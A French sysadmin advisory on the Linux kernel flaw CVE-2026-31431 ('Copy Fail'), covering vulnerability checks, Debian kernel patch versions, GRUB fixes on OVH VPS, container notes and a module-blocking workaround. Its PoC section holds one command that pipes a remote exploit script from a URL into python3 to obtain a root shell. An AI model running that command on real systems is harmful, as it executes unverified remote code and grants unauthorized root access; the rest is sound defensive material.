# CVE-2026-31431 — Copy Fail

Date de découverte : 3 mai 2026

## Description

Un bug logique dans le sous-système `authencesn` du noyau Linux, exploitable via `AF_ALG` (API crypto du noyau) et `splice()`, permettant une écriture de 4 octets dans le page cache d'un binaire setuid (ex. `/usr/bin/su`), sans laisser de trace sur le disque.

Résultat : élévation de privilèges locale vers root, 100% fiable, sans race condition ni offset spécifique à la distribution.

## Systèmes affectés

- Tous les noyaux Linux compilés entre 2017 et le patch (commit `a664bf3d603d`)
- Ubuntu 24.04, Amazon Linux 2023, RHEL 10.1, SUSE 16, Debian et dérivés
- Nécessite uniquement un compte utilisateur non privilégié

## Tester sa vulnérabilité

### 1. Vérifier la version du noyau

```bash
uname -r
```

Un noyau compilé entre 2017 et le commit `a664bf3d603d` est potentiellement vulnérable.

### 2. Vérifier si le module `algif_aead` est chargé

```bash
lsmod | grep algif_aead
```

Si le module est présent, la surface d'attaque est active.

### 3. Vérifier si des binaires setuid sont exposés

```bash
find / -perm -4000 -type f 2>/dev/null
```

La présence de binaires comme `/usr/bin/su`, `/usr/bin/sudo` ou `/usr/bin/newgrp` confirme que l'exploitation est possible.

### 4. Vérifier le paquet kernel installé (Debian/Ubuntu)

```bash
dpkg -l | grep linux-image
```

Comparer la version affichée avec la version corrigée (`6.12.85-1` pour Debian Trixie). Si la version est inférieure, le système est vulnérable.

### 5. Outil de détection (PoC officiel)

Le dépôt [theori-io/copy-fail-CVE-2026-31431](https://github.com/theori-io/copy-fail-CVE-2026-31431) propose un outil de détection **sans exploitation** :

> **AVERTISSEMENT** : Comme pour tout code tiers, vérifiez le contenu des sources avant de compiler et d'exécuter. Si le dépôt GitHub était compromis, `make check && ./check-vuln` pourrait exécuter du code malveillant. Préférez inspecter le code source avant toute exécution, ou utiliser les méthodes 1 à 4 ci-dessus qui ne reposent que sur des outils système natifs.

```bash
git clone https://github.com/theori-io/copy-fail-CVE-2026-31431
cd copy-fail-CVE-2026-31431
# Inspecter le code avant de continuer :
# less check-vuln.c  (ou équivalent)
make check
./check-vuln
```

Le script retourne `VULNERABLE` ou `NOT VULNERABLE` sans modifier le système.

## PoC / Exploitation (environnement de test uniquement)

> **AVERTISSEMENT** : La commande ci-dessous exploite réellement la faille et élève les privilèges vers root. Elle ne doit être exécutée que sur une machine isolée que vous contrôlez totalement (VM locale, lab de test), **jamais sur un système de production**. De plus, `curl URL | python3` exécute du code arbitraire depuis un serveur tiers sans vérification préalable — vérifiez le contenu du script avant de l'exécuter.

```bash
# Sur une VM de test uniquement
curl https://copy.fail/exp | python3 && su
# id
# uid=0(root) gid=1002(user) groups=1002(user)
```

Si la commande aboutit et retourne un shell root, le système est vulnérable. Appliquer immédiatement le correctif décrit ci-dessous.

## Correctif Debian Trixie

Le patch est disponible dans le paquet `linux` version **6.12.85-1** (trixie-security), annoncé dans le bulletin **DSA-6238-1**.

### Problème rencontré sur VPS OVH

Le VPS tournait sur la variante `linux-image-cloud-amd64` (version `6.12.74`). Cette variante n'avait pas encore reçu son build de sécurité au moment de la vérification.

```bash
uname -r
# 6.12.74+deb13+1-cloud-amd64
```

Le meta-paquet `linux-image-amd64` pointait bien vers `6.12.85-1` mais n'était pas installé.

### Solution appliquée

Installation du kernel standard corrigé (fonctionne parfaitement sur VPS OVH / KVM) :

```bash
apt install linux-image-amd64
reboot
```

> `linux-headers-amd64` n'est pas nécessaire sauf si vous compilez des modules DKMS (pilotes propriétaires, VirtualBox, etc.).

Après reboot, vérifier :

```bash
uname -r
# doit afficher 6.12.85-xxx
```

### Statut vérifié — VPS OVH / Trixie (variante cloud)

La variante `linux-image-cloud-amd64` a finalement reçu son build de sécurité. La version **`6.12.85-1`** de ce paquet intègre bien le correctif CVE-2026-31431 et est considérée comme **saine** sur un VPS OVH sous Debian Trixie.

```bash
dpkg -l | grep linux-image-cloud-amd64
# ii  linux-image-cloud-amd64  6.12.85-1  amd64  Linux for x86-64 cloud (meta-package)

uname -r
# 6.12.85+deb13-cloud-amd64
```

Il n'est donc **pas nécessaire** de passer sur `linux-image-amd64` (kernel standard) si le paquet cloud est déjà à cette version.

## Correctif Debian Bookworm

Le patch est disponible dans le paquet `linux` version **6.1.170-1** (bookworm-security), annoncé dans le bulletin **DSA-6243-1**.

```bash
apt update && apt install linux-image-amd64
reboot
```

Vérifier après reboot :

```bash
dpkg -l | grep linux-image-amd64
# doit afficher >= 6.1.170-1

uname -r
# doit afficher 6.1.170-xxx
```

> Pour la variante cloud (`linux-image-cloud-amd64`), vérifier que le paquet est également à `6.1.170-1` ou supérieur via `dpkg -l | grep linux-image-cloud-amd64`.

## Correctif Debian Bullseye

Debian Bullseye (11) est encore sous support LTS étendu et a reçu ses patches de sécurité.

### Kernel standard (5.10)

Annoncé via **DLA-4560-1** :

```bash
apt update && apt install linux-image-amd64
reboot
```

Vérifier après reboot :

```bash
dpkg -l | grep linux-image-amd64
# doit afficher >= 5.10.251-3

uname -r
# doit afficher 5.10.251-xxx
```

### Kernel backport linux-6.1

Si vous utilisez le kernel backporté `linux-6.1`, annoncé via **DLA-4561-1** :

```bash
apt update && apt install linux-image-amd64
reboot
```

Vérifier après reboot :

```bash
dpkg -l | grep linux-image
# doit afficher >= 6.1.170-1~deb11u1
```

### Problème rencontré sur VPS OVH / Bullseye (variante cloud 5.10)

La variante `linux-image-cloud-amd64` pointant vers `5.10.0-xx-cloud-amd64` n'a pas reçu son build de sécurité dans `bullseye-security`.

```bash
uname -a
# Linux vps-xxx 5.10.0-35-cloud-amd64 #1 SMP Debian 5.10.237-1 (2025-05-19) x86_64
# → variante cloud non patchée
```

**Solution** : installer le kernel standard qui, lui, a bien reçu le patch :

```bash
apt install linux-image-amd64
reboot
```

Après reboot, vérifier :

```bash
uname -r
# doit afficher 5.10.251-xxx (sans suffixe cloud)
```

> En attendant le reboot, appliquer le contournement `algif_aead` (voir section "Contournement temporaire").

### Problème rencontré sur VPS OVH / Bullseye (backport linux-6.1 cloud + GRUB)

Situation plus complexe : `linux-image-cloud-amd64` pointe vers le backport `6.1.90-1~bpo11+1` (variante cloud non patchée), et GRUB démarre sur ce kernel car son numéro de version est plus élevé que le `5.10.251-3` patché.

```bash
dpkg -l | grep linux-image | grep ii
# ii  linux-image-5.10.0-41-amd64              5.10.251-3          ← patché, mais non démarré
# ii  linux-image-6.1.0-0.deb11.21-cloud-amd64 6.1.90-1~bpo11+1   ← non patché, démarré par GRUB
# ii  linux-image-amd64                        5.10.251-3
# ii  linux-image-cloud-amd64                  6.1.90-1~bpo11+1

uname -r
# 6.1.0-0.deb11.21-cloud-amd64  → vulnérable malgré le 5.10.251-3 installé
```

**Solution** : forcer GRUB sur le kernel patché, rebooter, puis supprimer les kernels cloud.

**Étape 1** — Forcer GRUB sur `5.10.0-41-amd64` :

```bash
sed -i 's/^GRUB_DEFAULT=.*/GRUB_DEFAULT="Advanced options for Debian GNU\/Linux>Debian GNU\/Linux, with Linux 5.10.0-41-amd64"/' /etc/default/grub
update-grub
reboot
```

**Étape 2** — Après reboot, vérifier :

```bash
uname -r
# doit afficher 5.10.0-41-amd64
```

**Étape 3** — Supprimer les kernels cloud et remettre GRUB en auto :

```bash
apt purge linux-image-cloud-amd64 linux-image-6.1.0-0.deb11.21-cloud-amd64
sed -i 's/^GRUB_DEFAULT=.*/GRUB_DEFAULT=0/' /etc/default/grub
update-grub
```

## Docker et conteneurs

Les conteneurs Docker **partagent le noyau de l'hôte** — ils n'ont pas leur propre kernel. La vulnérabilité se situe donc entièrement au niveau de la machine hôte (ou du VPS hôte).

### Points clés

- `uname -r` depuis l'intérieur d'un conteneur affiche le noyau hôte — cela peut servir à vérifier, mais ce n'est pas suffisant
- `dpkg -l | grep linux-image` depuis un conteneur ne fonctionne **pas** (le conteneur n'a pas les paquets kernel de l'hôte) — **la vérification doit se faire sur l'hôte**
- Un processus dans un conteneur **non privilégié** peut exploiter la faille si le noyau hôte est vulnérable, car `AF_ALG` est accessible depuis les namespaces réseau par défaut dans Docker



## Contournement temporaire (sans reboot)

Désactiver le module `algif_aead` :

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead
# Si le module n'était pas chargé : "ERROR: Module algif_aead is not currently loaded" — c'est normal
```

Vérifier que le blocage est bien actif :

```bash
modprobe algif_aead
# Résultat attendu :
# modprobe: ERROR: could not insert 'algif_aead': Operation not permitted
```

`Operation not permitted` confirme que le module est définitivement bloqué au chargement.

Cette opération n'affecte pas dm-crypt/LUKS, SSH, kTLS, IPsec ni OpenSSL en configuration standard.

## Versions du noyau corrigées

| Distribution | Variante | Version corrigée minimale | Bulletin | Statut vérifié |
|---|---|---|---|---|
| Debian Trixie (13) | `linux-image-amd64` | `6.12.85-1` | DSA-6238-1 | ✓ |
| Debian Trixie (13) | `linux-image-cloud-amd64` | `6.12.85-1` | DSA-6238-1 | ✓ VPS OVH |
| Debian Bookworm (12) | `linux-image-amd64` | `6.1.170-1` | DSA-6243-1 | ✓ |
| Debian Bookworm (12) | `linux-image-cloud-amd64` | `6.1.170-1` | DSA-6243-1 | |
| Debian Bullseye (11) | `linux-image-amd64` | `5.10.251-3` | DLA-4560-1 | ✓ VPS OVH |
| Debian Bullseye (11) | `linux-6.1` | `6.1.170-1~deb11u1` | DLA-4561-1 | |
| Debian Forky / Sid | tous | `6.19.14-1` / `7.0.3-1` | — | ✓ |

> Commande de vérification universelle : `dpkg -l | grep linux-image`

## Références

- https://copy.fail
- https://xint.io/blog/copy-fail-linux-distributions
- https://security-tracker.debian.org/tracker/CVE-2026-31431
- https://github.com/theori-io/copy-fail-CVE-2026-31431
